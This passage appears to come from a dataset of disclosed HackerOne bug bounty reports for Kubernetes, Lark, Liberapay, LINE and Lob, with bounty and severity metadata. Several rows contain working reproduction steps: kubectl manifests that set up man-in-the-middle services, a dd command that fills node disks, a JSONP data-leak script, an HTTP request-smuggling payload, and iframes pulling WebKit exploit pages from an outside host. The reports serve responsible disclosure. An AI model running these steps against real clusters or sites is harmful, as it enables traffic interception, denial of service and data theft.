Code 369 BytesWrap lines Copy Download1kubectl get -n kube-system svc/kubernetes-dashboard
2# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
3# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m
4
5kubectl get -n kube-system endpoints kubernetes-dashboard
6# NAME                   ENDPOINTS           AGE
7# kubernetes-dashboard   10.233.115.2:8443   9h
Deploy the MITM
Code 627 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-pod-lb
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: https
10    port: 443
11    protocol: TCP
12    targetPort: 8443
13  - name: https2
14    port: 8443
15    protocol: TCP
16    targetPort: 8443
17  selector:
18    app: echoserver
19  type: LoadBalancer
20EOF
21kubectl proxy --port=8080 &
22sleep 3
23curl -k -v -XPATCH  -H ""Accept: application/json"" -H ""Content-Type: application/merge-patch+json"" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-pod-lb/status' -d '{""status"":{""loadBalancer"":{""ingress"":[{""ip"":""10.233.115.2""}]}}}'
24pkill kubectl
Test if MITM works
Code 279 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
5# node -> endpoint
6curl -sv https://10.233.115.2:8443 -k
7# pod -> endpoint
8kubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k
Cleanup
Code 48 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-pod-lb
### 3b) k8s pod traffic interception using service type ClusterIP + externalIPs
Find a service to attack + its endpoints, in my testing I chose kubernetes-dashboard
Code 369 BytesWrap lines Copy Download1kubectl get -n kube-system svc/kubernetes-dashboard
2# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
3# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m
4
5kubectl get -n kube-system endpoints kubernetes-dashboard
6# NAME                   ENDPOINTS           AGE
7# kubernetes-dashboard   10.233.115.2:8443   9h
Deploy the MITM
Code 357 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-pod-eip
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: https
10    port: 443
11    protocol: TCP
12    targetPort: 8443
13  - name: https2
14    port: 8443
15    protocol: TCP
16    targetPort: 8443
17  selector:
18    app: echoserver
19  type: ClusterIP
20  externalIPs:
21    - 10.233.115.2
22EOF
Test if MITM works
Code 279 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
5# node -> endpoint
6curl -sv https://10.233.115.2:8443 -k
7# pod -> endpoint
8kubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k
Cleanup
Code 49 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-pod-eip
### 4a) node localhost traffic interception using service type LoadBalancer
(This might also work against a container with hostNetwork=true)
Deploy the MITM
Code 691 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-local-lb
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: smtp
10    port: 25
11    protocol: TCP
12    targetPort: 8080
13  - name: http
14    port: 80
15    protocol: TCP
16    targetPort: 8080
17  - name: https
18    port: 443
19    protocol: TCP
20    targetPort: 8443
21  selector:
22    app: echoserver
23  type: LoadBalancer
24EOF
25kubectl proxy --port=8080 &
26sleep 3
27curl -k -v -XPATCH  -H ""Accept: application/json"" -H ""Content-Type: application/merge-patch+json"" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-local-lb/status' -d '{""status"":{""loadBalancer"":{""ingress"":[{""ip"":""127.0.0.1""}]}}}'
28pkill kubectl
On my CentOS7 there is postfix listening on 127.0.0.1:25 (thus the test with port 25)
Test if the MITM works
Code 72 BytesWrap lines Copy Download1curl http://127.0.0.1:25
2curl http://127.0.0.1
3curl https://127.0.0.1 -k
Cleanup
Code 50 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-local-lb
### 4b) node localhost traffic interception using service type ClusterIP + externalIPs
Try to deploy our MITM
Code 285 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-local-eip
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: https
10    port: 443
11    protocol: TCP
12    targetPort: 8443
13  selector:
14    app: echoserver
15  type: ClusterIP
16  externalIPs:
17    - 127.0.0.1
18EOF
This one fails with
Code 136 BytesWrap lines Copy Download1The Service ""mitm-local-eip"" is invalid: spec.externalIPs[0]: Invalid value: ""127.0.0.1"": may not be in the loopback range (127.0.0.0/8)
Additional informations:
This work doesn't claim to be exhaustive, here are some limitations:

I didn't attempt to MITM DNS traffic, as it's UDP, it might behave differently than TCP, but pretty sure it works in some cases
I didn't try to reproduce my findings with other kube-proxy replacements (Cilium, ...)
I didn't try to reproduce my findings with Network policies configured
I didn't try to reproduce my findings with services mesh encryption like Istio
I didn't try multiple CNI
I didn't look at IPv6
I didn't try to MITM Loadbalancer IPs with external IPs and vice versa
I didn't fully investigate if having a service that changes ports (443->8443) makes a difference versus a service that doesn't (443->443)

Issues 2/3/4 could be fixed via a blacklist approach, at the API level, loadBalancerIP and externalIPs must not be allowed in the same range as clusterIPs, pods IPs, localhost, nodeIPs, and maybe some other reserved ranged.
Issues 1a/1b are expected behaviours in my opinion. I want to be able to access my LoadBalancer IP from my pods and nodes, so a possible fix here would be a whitelist, and give the rights to real LB controllers to update this whitelist.
We also need to make sure we can't use the same IP as both Loadbalancer IP and external IP.
Supporting Material/References:
Both kube-proxy config attached
Command line to create the test GKE cluster:
Code 919 BytesWrap lines Copy Download1gcloud beta container --project ""my-project"" clusters create ""kubeproxy-tests"" --zone ""us-central1-a"" --no-enable-basic-auth --cluster-version ""1.15.4-gke.22"" --machine-type ""n1-standard-2"" --image-type ""COS"" --disk-type ""pd-standard"" --disk-size ""100"" --metadata disable-legacy-endpoints=true --scopes ""https://www.googleapis.com/auth/devstorage.read_only"",""https://www.googleapis.com/auth/logging.write"",""https://www.googleapis.com/auth/monitoring"",""https://www.googleapis.com/auth/servicecontrol"",""https://www.googleapis.com/auth/service.management.readonly"",""https://www.googleapis.com/auth/trace.append"" --num-nodes ""3"" --enable-stackdriver-kubernetes --no-enable-ip-alias --network ""projects/copper-frame-263204/global/networks/default"" --subnetwork ""projects/copper-frame-263204/regions/us-central1/subnetworks/default"" --addons HorizontalPodAutoscaling,HttpLoadBalancing --enable-autoupgrade --enable-autorepair
For GKE I used ""metrics-server"" instead of ""kubernetes-dashboard"" as victim service
Impact
An attacker able to create and/or patch services can, depending on the mode of kube-proxy:

MITM traffic destined for IPs external to the cluster (ex: 1.1.1.1)
MITM traffic destined for ClusterIP IP
MITM traffic destined for pod IP
MITM traffic destined for 127.0.0.1
3 attachments:F669473: Capture_d__cran_du_2019-12-26_20-20-23.pngF669483: kubeproxy.ipvs.confF669493: kubeproxy.iptables.confSummary by champtarWrite up available at https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/",https://hackerone.com/reports/764986,California,United States,San Francisco,2019,12,27,6,5
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,5.5,Denial of Service,Node disk DOS by writing to container /etc/hosts,"kebe  submitted a report to Kubernetes.May 7th (3 years ago)Report Submission Form
Summary:
Pod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.
A normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.
Not only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.
Kubernetes Version:
<=1.18
Component Version:
Docker 19.03
Steps To Reproduce:

use kubectl create a pod like kubectl run 
run kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M
run df -h /var/lib/kubelet on host that pod running, you can see the disk avaliable space are decreasing until the disk full.

Supporting Material/References:
Code 2.78 KiBWrap lines Copy Download1[root@kebe-sm-315 ~]# kubectl exec -it rate-c848c5c8b-5b8vm sh
2kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.
3Defaulting container name to rate.
4Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
5/ # df -h
6Filesystem                Size      Used Available Use% Mounted on
7/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1
8                         10.0G     40.3M     10.0G   0% /
9tmpfs                    64.0M         0     64.0M   0% /dev
10tmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup
11/dev/mapper/centos-root
12                         53.0G     28.6G     24.4G  54% /dev/termination-log
13/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf
14/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname
15/dev/mapper/centos-root
16                         53.0G     28.6G     24.4G  54% /etc/hosts
17shm                      64.0M      8.0K     64.0M   0% /dev/shm
18tmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount
19tmpfs                     9.7G         0      9.7G   0% /proc/acpi
20tmpfs                    64.0M         0     64.0M   0% /proc/kcore
21tmpfs                    64.0M         0     64.0M   0% /proc/keys
22tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
23tmpfs                    64.0M         0     64.0M   0% /proc/timer_stats
24tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
25tmpfs                     9.7G         0      9.7G   0% /proc/scsi
26tmpfs                     9.7G         0      9.7G   0% /sys/firmware
27
28[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
29总用量 12
30drwxr-xr-x  5 root root   71 5月   7 12:29 .
31drwxr-x--- 50 root root 4096 5月   7 12:29 ..
32drwxr-x---  5 root root   55 5月   7 12:31 containers
33-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts
34drwxr-x---  3 root root   37 5月   7 12:29 plugins
35drwxr-xr-x  4 root root   65 5月   7 12:29 volumes
36[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M
37Defaulting container name to rate.
38Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
39100+0 records in
40100+0 records out
41[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
42总用量 102408
43drwxr-xr-x  5 root root        71 5月   7 12:29 .
44drwxr-x--- 50 root root      4096 5月   7 12:29 ..
45drwxr-x---  5 root root        55 5月   7 12:31 containers
46-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts
47drwxr-x---  3 root root        37 5月   7 12:29 plugins
48drwxr-xr-x  4 root root        65 5月   7 12:29 volumes

[attachment / reference]

Impact
If someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.",https://hackerone.com/reports/867699,California,United States,San Francisco,2020,5,7,7,11
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.5,Improper Access Control - Generic,Node Validation Admission does not observe all oldObject fields,"ariellima  submitted a report to Kubernetes.Feb 4th (2 years ago)Summary:
The Validating Admission webhook for Node Objects is passing oldObject fields incorrectly on AdmissionReview.Request. It was identified initially in metadata.labels, but a list of impacted fields follows below:
oldNode.Spec.PodCIDRs
oldNode.Spec.ProviderID
oldNode.Spec.ConfigSource
oldNode.Status.Config
oldNode.ObjectMeta
oldNode.Status.Capacity
oldNode.Spec.Unschedulable
oldNode.Status
oldNode.Spec.Taints
Those fields are being set with the same values as the new node object, potentially allowing users to bypass validating admission to update node labels, taints, and others.
Kubernetes Version:
v1.19.x
Component Version:
Validation Webhook for Nodes
Steps To Reproduce:

Create a Validating Webhook Configuration for Node updates
Create an admission Webhook that outputs the content of oldNode and newNode from the admissionReview obejct
Run a patch that changes one of the fields mentioned above.
Look at the log output and compare the old and newObject CRs -- you will notice that the patch you just made appears on the new AND oldObject CRs logged.

Supporting Material/References:
Validating Webhook we created -> https://github.com/ArielLima/managed-cluster-validating-webhooks/blob/nodelabels-webhook/pkg/webhooks/node/node.go#L145-L179
Dummy Validating Webhook -> https://github.com/openshift/generic-admission-server/pull/40/files#diff-ce34cccb3b86fc2740015cfa93de7e314262e3db76d54708d5e1c302e6986436R39
Potential issue location -> https://github.com/kubernetes/kubernetes/blob/c970a46bc1bcc100bbbfabd5c12bd4c5d87f8aea/pkg/apis/core/validation/validation.go#L4792-L4794
Impact
Even though a validating admission webhook thinks that it is restricting actors from mutating certain fields like taints, labels, and schedulability it is not.
Some examples of actions you could perform:

change labels to steer workloads
change labels to prevent scheduling any workload
change taints to push pods off a node",https://hackerone.com/reports/1095612,California,United States,San Francisco,2021,2,4,16,40
Lark Technologies,1-10,0.0,50m-100m,"$1,000.00",Medium,5.45,Cross-site Scripting (XSS) - Generic,[Lark Android] Vulnerability in exported activity WebView,shell_c0de  submitted a report to Lark Technologies.Sep 12th (3 years ago),https://hackerone.com/reports/694053,California,United States,Folsom,2019,9,12,22,29
Lark Technologies,1-10,0.0,50m-100m,"$5,000.00",Critical,9.4,Privilege Escalation,Attacker is able to join any tenant on larksuite and view personal files/chats.,"imran_nisar  submitted a report to Lark Technologies.Oct 7th (about 1 year ago)imran_nisar   posted a comment. Oct 7th (about 1 year ago)h1_analyst_amey HackerOne triage  changed the status to Triaged. Oct 11th (about 1 year ago)Lark Technologies  rewarded imran_nisar with a $5,000 bounty and a $2,500 bonus. Oct 12th (about 1 year ago)imran_nisar   posted a comment. Oct 12th (about 1 year ago)imran_nisar   posted a comment. Oct 20th (about 1 year ago)ankur_bugger Lark Technologies staff  posted a comment. Oct 20th (about 1 year ago)ankur_bugger Lark Technologies staff  closed the report and changed the status to Resolved. Oct 20th (about 1 year ago)imran_nisar   requested to disclose this report. Oct 20th (about 1 year ago)suhanariyaz Lark Technologies staff  posted a comment. Oct 23rd (about 1 year ago)suhanariyaz Lark Technologies staff  agreed to disclose this report. Nov 3rd (about 1 year ago)  This report has been disclosed. Nov 3rd (about 1 year ago)Lark Technologies  has locked this report. Nov 3rd (about 1 year ago)",https://hackerone.com/reports/1363185,California,United States,Folsom,2021,10,7,20,58
Lark Technologies,1-10,0.0,50m-100m,"$1,000.00",High,7.1,Privilege Escalation,Non privileged user is able to approve his own app himself leading to mass privilege  escalations.,imran_nisar  submitted a report to Lark Technologies.Apr 19th (2 years ago),https://hackerone.com/reports/1168475,California,United States,Folsom,2021,4,19,11,30
Lark Technologies,1-10,0.0,50m-100m,"$1,500.00",Critical,9.6,Server-Side Request Forgery (SSRF),Server Side Request Forgery,"jin0ne  submitted a report to Lark Technologies.Jul 16th (3 years ago)Summary by jin0neDetails
https://jinone.github.io/bugbounty-a-simple-ssrf/",https://hackerone.com/reports/644238,California,United States,Folsom,2019,7,16,10,33
Lark Technologies,1-10,0.0,50m-100m,"$1,000.00",High,7.5,Improper Access Control - Generic,Improper Access Control on Lark Footer Feature,imran_nisar  submitted a report to Lark Technologies.Apr 20th (2 years ago),https://hackerone.com/reports/1169340,California,United States,Folsom,2021,4,20,7,42
Lark Technologies,1-10,0.0,50m-100m,$550.00,Medium,5.45,Server-Side Request Forgery (SSRF),SSRF with information disclosure,jin0ne  submitted a report to Lark Technologies.Mar 4th (3 years ago),https://hackerone.com/reports/810401,California,United States,Folsom,2020,3,4,9,18
Lark Technologies,1-10,0.0,50m-100m,"$3,000.00",Critical,9.5,Server-Side Request Forgery (SSRF),Stored XSS & SSRF in Lark Docs,mike12  submitted a report to Lark Technologies.Jun 5th (2 years ago),https://hackerone.com/reports/892049,California,United States,Folsom,2020,6,5,14,19
Liberapay,1-10,0.0,No value,$50.00,Medium,4.3,Information Disclosure,Exploiting JSONP callback on /username/charts.json endpoint leads to information disclosure despite user's privacy settings,"kapytein  submitted a report to Liberapay.Jun 5th (4 years ago)Hello!
Vulnerability Details
The /username/charts.json endpoint can return a JSONP callback due to the fact that jsonp_dump is used in the file charts.json.spt. It appears that the content of the JSONP request depends on the authentication of the user. If the user enabled the privacy setting which hides the receiving donation data of the user,  a 403 error will be returned unless  the user is authenticated.
This happens here:
Code 114 BytesWrap lines Copy Download1if participant.hide_receiving:
2    if user != participant and not user.is_admin:
3        raise response.error(403)
The vulnerable code is here:
Code 37 BytesWrap lines Copy Download1[---] application/json via jsonp_dump
Basically, a jsonp_dump is unnecessary in this case (I did not notice a case where cross-domain requests need to be done), and it should be replaced with json_dump instead.
How could this be exploited?
This would eventually allow any site to call the JSONP callback, and receive the receiving donation data of the user, despite it's privacy settings. This will lead to unwanted information disclosure.
Proof of Concept
Code 148 BytesWrap lines Copy Download1<script>
2function rip(a) {
3
4alert(JSON.stringify(a[1]));
5
6}
7</script>
8<script src=""https://liberapay.com/~153779/charts.json?callback=rip""></script>
Host this file, visit the site authenticated and it will print out the first row in the JSON Array. If you have not received any donation through LIbrapay so far, an empty JSON array will be returned.
Impact
This will lead to unwanted information disclosure due to the fact that privacy settings of the user will be ignored.",https://hackerone.com/reports/361951,No value,No value,No value,2018,6,5,2,23
LINE,1001-5000,0.0,200m-1b,$250.00,Medium,4.3,Denial of Service,DoS of LINE client for Android via message containing multiple unicode characters (0x0e & 0x0f),lyn_c  submitted a report to LINE.Dec 14th (2 years ago),https://hackerone.com/reports/1058383,Tokyo,Japan,Tokyo,2020,12,14,11,20
LINE,1001-5000,0.0,200m-1b,"$12,500.00",Critical,9.5,Misconfiguration,Spring Actuator endpoints publicly available and broken authentication,kazan71p  submitted a report to LINE.Apr 4th (3 years ago),https://hackerone.com/reports/838635,Tokyo,Japan,Tokyo,2020,4,4,5,14
LINE,1001-5000,0.0,200m-1b,$475.00,Medium,5.4,Path Traversal,Path traversal in ZIP extract routine on LINE Android,kanytu  submitted a report to LINE.Apr 26th (3 years ago),https://hackerone.com/reports/859469,Tokyo,Japan,Tokyo,2020,4,26,1,7
LINE,1001-5000,0.0,200m-1b,"$5,000.00",Critical,9.5,Misconfiguration,"Spring Actuator endpoints publicly available, leading to account takeover",kazan71p  submitted a report to LINE.Apr 29th (3 years ago),https://hackerone.com/reports/862589,Tokyo,Japan,Tokyo,2020,4,29,17,29
LINE,1001-5000,0.0,200m-1b,"$9,000.00",High,7.95,HTTP Request Smuggling,Request smuggling on admin-official.line.me could lead to account takeover,shaolin_tw  submitted a report to LINE.Nov 18th (3 years ago),https://hackerone.com/reports/740037,Tokyo,Japan,Tokyo,2019,11,18,19,2
LINE,1001-5000,0.0,200m-1b,"$4,750.00",Critical,9.5,Privilege Escalation,Able to Become Admin for Any LINE Official Account,ngalog  submitted a report to LINE.Sep 20th (3 years ago),https://hackerone.com/reports/698579,Tokyo,Japan,Tokyo,2019,9,20,2,53
LINE,1001-5000,0.0,200m-1b,"$11,500.00",Critical,10.0,Code Injection,Arbitrary Code Execution via npm misconfiguration – installing internal libraries from the public registry,alexbirsan  submitted a report to LINE.Nov 25th (2 years ago),https://hackerone.com/reports/1043385,Tokyo,Japan,Tokyo,2020,11,25,11,55
LINE,1001-5000,0.0,200m-1b,"$3,000.00",Medium,5.7,Information Disclosure,CORS misconfiguration leads to users information disclosure at https://studyroom.line.me,duahaubadao  submitted a report to LINE.Jul 16th (2 years ago),https://hackerone.com/reports/924951,Tokyo,Japan,Tokyo,2020,7,16,4,59
LINE,1001-5000,0.0,200m-1b,"$1,990.00",High,8.1,Cross-site Scripting (XSS) - DOM,DOM-based XSS on mobile.line.me,zophi  submitted a report to LINE.Nov 12th (3 years ago),https://hackerone.com/reports/736272,Tokyo,Japan,Tokyo,2019,11,12,15,20
LINE,1001-5000,0.0,200m-1b,"$4,750.00",High,7.95,Improper Access Control - Generic,Insufficient access control on all BCRM instances leading to the ability to create admin accounts using the API,j0eii  submitted a report to LINE.Apr 1st (3 years ago),https://hackerone.com/reports/836081,Tokyo,Japan,Tokyo,2020,4,1,10,7
LINE,1001-5000,0.0,200m-1b,"$1,350.00",Medium,5.45,Server-Side Request Forgery (SSRF),Get-based SSRF limited to HTTP protocol on https://resizer.line-apps.com/form,ledz1996  submitted a report to LINE.Oct 3rd (3 years ago),https://hackerone.com/reports/707014,Tokyo,Japan,Tokyo,2019,10,3,10,8
LINE,1001-5000,0.0,200m-1b,"$2,785.00",High,8.0,Path Traversal,Path traversal in filename in LINE Mac client,"hackerontwowheels  submitted a report to LINE.Nov 2nd (3 years ago)Summary by hackerontwowheelsThrough a logic error in file name parsing, it was possible for a malicious actor to send a specially crafted zip file to a target user, which when opened in the MAC App would execute any application or executable in ~/Downloads. Furthermore, we discovered two ways to bypass the file upload restrictions where we could send any file extension to users, for example .terminal files.  Using both logic errors, it was possible for an attacker to send a malicious executable, and then a malformed zipped file to execute the previous executable bypassing all file transfer restrictions and gaining code execution on unsuspecting users.",https://hackerone.com/reports/727727,Tokyo,Japan,Tokyo,2019,11,2,2,32
LINE,1001-5000,0.0,200m-1b,"$1,347.00",Medium,4.3,Improper Access Control - Generic,Improper Access Control in LINE Timeline API that returns a list of hidden friends,"66ed3gs  submitted a report to LINE.Apr 20th (3 years ago)Summary by 66ed3gs● Summary
Due to insufficient access control, hackers were able to obtain hidden lists of others by specifying their internal ID.
● Discovery
I was looking for an interesting endpoint by dynamically intercepting HTTP requests that LINE client made. Then, I found this HTTP request, and I predicted that it could be vulnerable.
Code 361 Bytes1POST /vulnerable/endpoint HTTP/1.1
2Content-Type: application/json
3x-lal: ja_JP
4Accept-Language: ja_JP
5X-Line-Signup-Region: JP
6X-Line-ChannelToken: XXX
7X-Line-Mid: XXX
8X-Line-Application: IOS	10.5.0	iOS	13.4.1
9User-Agent: iphoneapp.line/10.5.0 (iPad; U; CPU iOS 13_4_1 like Mac OS X; ja_JP; g)
10Content-Length: 62
11
12{""id"":""user's internal ID"",""userCountLimit"":20}
As a result, this endpoint was vulnerable, so I wondered how this could be used. The endpoint included the user's internal ID, name, and profile picture URL in the response.
● Exploit / Impact
Theoretically, hackers could disclose a huge social graph by chaining internal IDs in the response.
LINE Messenger is a closed SNS, so disclosing private relationships may undermine users' confidence.
● Experience
LINE quickly fixed the vulnerability with excellent teamwork before such an incident occurred. Thank you for keeping LINE users safe✨",https://hackerone.com/reports/853894,Tokyo,Japan,Tokyo,2020,4,20,1,48
LINE,1001-5000,0.0,200m-1b,"$1,990.00",Medium,5.45,Cross-site Scripting (XSS) - Reflected,Reflected XSS in OAUTH2 login flow,derision  submitted a report to LINE.Sep 18th (3 years ago),https://hackerone.com/reports/697099,Tokyo,Japan,Tokyo,2019,9,18,11,57
Lob,101-250,0.0,1m-10m,$500.00,Medium,5.3,HTTP Request Smuggling,HTTP Request Smuggling on vpn.lob.com,"painreigns  submitted a report to Lob.Sep 13th (3 years ago)Hi ,
vpn.lob.com is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.
Steps to reproduce 

Run the burp suite turbo intruder on the following request 

Code 1.22 KiBWrap lines Copy Download1POST /auth/session HTTP/1.1
2Host: vpn.lob.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Content-Length: 50
9Connection: close
10Referer: https://vpn.lob.com/login
11Cookie: _vwo_uuid_v2=D7FF7EABF1E283CDC77767B75ABC4FA51|74f99aef48c9151f1dd02b48985a0238; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22b0bd8d42-5f78-4a1b-8de8-20f4f245fc62%22; amplitude_id_0140e3eb2f7505ea65a1fa2a4e6e4c1flob.com=eyJkZXZpY2VJZCI6IjgwMzgyZjJmLWM1NDctNDM1Mi04NWU4LWI0ZGMxYjQ1MjAxZFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU2NTUwNTA1ODcxMywibGFzdEV2ZW50VGltZSI6MTU2NTUwNTE2NjQ5NSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; intercom-id-wmjqtt9h=caf415b8-9c72-480c-b8ae-c1766163f6c6; __zlcmid=rmi9oFUDOriRTh; zarget_visitor_info=%7B%22BRXP%5BP_%22%3A1391918%2C%22BRXRPWP%22%3A1393270%7D; zarget_user_id=1561904574648r0.7869595723975263; landing_url=bG9iLmNvbS8=; zarget_goal_info=%7B%224752515957574A425C5B5C5842594C5E5E5659585E57%22%3A%5B1391658%5D%7D
12Transfer-Encoding : chunked
13
1427
15{""username"":""admin"",""password"":""admin""}
160
17
18


Script for the turbo intruder is attached with name script.txt


Observe 200 OK response for the auth/session post request which is supposed to give invalid credentials.Please refer the attached screenshots. ( Smuggle Request1.png ) 


This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). Also attached the recorded POC for the finding.


Impact
It is possible to smuggle the request and disrupt the user experience.
Ex : redirecting to 404 not found page , improper response from server
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.
For more information about the vulnerability please refer : https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn4 attachments:F582354: FinalResponse.pngF582355: Scripts.txtF582356: SmuggleRequest1.pngF582357: POC.mp4",https://hackerone.com/reports/694604,California,United States,San Francisco,2019,9,13,19,31
Lob,101-250,0.0,1m-10m,"$1,500.00",Critical,9.8,Use After Free,Old WebKit HTML agent in Template Preview function has multiple known vulnerabilities leading to RCE,"ajxchapman  submitted a report to Lob.Apr 2nd (4 years ago)Summary:
The Template Preview function allows users to render arbitrary HTML to a PDF document, this includes the ability to execute arbitrary Javascript. The HTML agent used to render the HTML is based on an old version of WebKit which has known security issues, for which public exploits and Proof of Concepts (PoCs) are available. Exploitation of these issues could lead to Remote Code Execution (RCE) on the AWS instance running the HTML renderer, potentially exposing sensitive user or configuration data.
Details:
The WebKit agent version appears to date from ~2013 based on version numbers and feature availability. This version has multiple known vulnerabilities for which many public exploits are available.
Specifically, the following resources demonstrate exploiting a memory leak and a Use after Free (UaF) issue to gain Remote Code Execution in a vulnerable WebKit version:

https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js
https://github.com/AlexAltea/orbital/blob/master/tools/dumper/exploit/500/index.html

These exploits are targeted at a different version and system (PlayStation 4) so do not directly result in RCE on against the Template Preview WebKit agent. However, the techniques they use can be translated to target the WebKit agent used. 
I have translated the two key exploit techniques used in the above exploits to target the Template Preview agent (see Steps to Reproduce). The first PoC I have produced exploits the memory leak to disclose internal process heap memory pointers. The second PoC demonstrates the UaF issue by completely crashing the Template Preview WebKit agent.
It should be noted at this point I have not invested the time to fully translate these exploits to gain RCE on Template Preview WebKit agent. Based on the results observed, successfully exploiting the memory leak and UaF, it would just be a matter of effort to achieve this.
Steps To Reproduce:
To demonstrate the identified memory leak issue create a new HTML Template with the following contents:
Code 183 BytesWrap lines Copy Download1<html>
2<body>
3  <iframe style=""width: 100%; min-height: 20000px;"" src=""http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/leak.html""></iframe>
4</body>
5</html>
To demonstrate the identified Use after Free issue create a new HTML Template with the following contents:
Code 184 BytesWrap lines Copy Download1<html>
2<body>
3  <iframe style=""width: 100%; min-height: 20000px;"" src=""http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/crash.html""></iframe>
4</body>
5</html>
Once the template is created, preview the template using the Preview function. This will cause the backend WebKit agent to render the given HTML page hosted at http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/. 
leak.html exploits the memory leak vulnerability to extract a 64bit pointer into the process heap where JSObjects are created. The screenshots below show the output of two separate runs of this template:
Image F459846: Screenshot_from_2019-04-02_09-32-03.png 30.21 KiBZoom in Zoom out Copy Download Image F459847: Screenshot_from_2019-04-02_09-32-15.png 31.07 KiBZoom in Zoom out Copy Download
In these screenshots you can clearly see that the memory location leaked changes, this is due to the ASLR memory randomisation application to the process when it is started. Each time this template is previewed the pointer disclosed will be slightly different due to ASLR. The full PDF files are available as attachments leaked_address1.pdf (F459840) and leaked_address2.pdf (F459839)
crash.html demonstrates the Use after Free vulnerability by crashing the WebKit renderer. The screenshot below details the error displayed to the user when this template is rendered, indicating that the WebKit agent crashed without producing any output:
Image F459843: Screenshot_from_2019-04-02_09-09-47.png 20.62 KiBZoom in Zoom out Copy Download
Supporting Material/References:
Attachments leaked_address1.pdf (F459840) and leaked_address2.pdf (F459839) show the output of two separate runs of this template. In these generated PDF files you can clearly see that the memory location leaked changes, this is due to the ASLR memory randomisation application to the process when it is started.
Addition resources detailing the specific vulnerabilities targeted in this report:

https://bugs.chromium.org/p/project-zero/issues/detail?id=1187
https://github.com/Cryptogenic/Exploit-Writeups/blob/master/WebKit/setAttributeNodeNS%20UAF%20Write-up.md

Impact
Exploitation of this issue could lead to Remote Code Execution on the AWS instance running the HTML renderer, potentially exposing sensitive user or configuration data.5 attachments:F459839: leaked_address2.pdfF459840: leaked_address1.pdfF459843: Screenshot_from_2019-04-02_09-09-47.pngF459846: Screenshot_from_2019-04-02_09-32-03.pngF459847: Screenshot_from_2019-04-02_09-32-15.png",https://hackerone.com/reports/520717,California,United States,San Francisco,2019,4,2,8,35
